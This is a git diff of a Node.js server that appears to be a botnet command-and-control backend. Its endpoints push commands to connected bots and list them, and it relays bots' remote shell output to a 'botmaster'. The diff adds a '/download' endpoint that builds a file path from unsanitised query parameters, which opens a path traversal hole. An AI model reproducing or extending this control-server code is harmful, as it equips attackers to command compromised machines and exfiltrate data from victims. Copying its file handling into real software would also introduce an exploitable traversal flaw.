@@ -3,6 +3,7 @@ const WebSocket = require('ws');
 
 const { save_file } = require ('./results_handlers')
 const { setup } = require ('./setup.js')
+const fs = require("fs");
 
 const port = 3000;
 let clients = {};
@@ -10,7 +11,9 @@ let botmasters = {};
 
 
 const server = http.createServer((req, res) => {
-    if (req.method === 'POST' && req.url === '/send-command') {
+    const url = new URL(req.url, `http://${req.headers.host}`);
+
+    if (req.method === 'POST' && url.pathname === '/send-command') {
         let body = '';
         req.on('data', chunk => {
             body += chunk.toString();
@@ -28,18 +31,34 @@ const server = http.createServer((req, res) => {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
         });
-    } else if (req.method === 'GET' && req.url === '/results') {
-        let body = '';
-        req.on('data', chunk => {
-            body += chunk.toString();
-        });
-        req.on('end', () => {
-            const command = JSON.parse(body);
-            //TODO devolver el archivo solicitado
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
-        });
-    } else if (req.method === 'GET' && req.url === '/bots') {
+    } else if (req.method === 'GET' && url.pathname === '/download') {
+
+        const objective = url.searchParams.get('objective');
+        const file_name = url.searchParams.get('filename');
+        if (objective && file_name){
+            try {
+                const data = fs.readFileSync("downloads/" + objective + "/" + file_name, 'utf-8');
+                // TODO optional hash for integrity check
+                const result = {
+                    type: "Download",
+                    name: file_name,
+                    hash: 0,
+                    data: data
+                };
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify(result));
+            } catch (err) {
+                console.error("Error reading file:", err)
+                res.writeHead(404, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'File not found' }));
+            }
+
+        } else {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: 'File not found' }));
+        }
+
+    } else if (req.method === 'GET' && url.pathname === '/bots') {
 
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ bots: Object.keys(clients) }));
@@ -103,8 +122,9 @@ wss.on('connection', (ws, req) => {
                     break;
 
                 case "Shell":
-                    console.log('Received shell result from client: ', ip)
-                    botmasters[result.botmaster].send(JSON.stringify(result.result))
+                    console.log('Received shell result from client: ', ip, result.result)
+                    let encoder = new TextEncoder();
+                    botmasters[result.botmaster].send(encoder.encode(result.result))
                     break;
 
                 default:
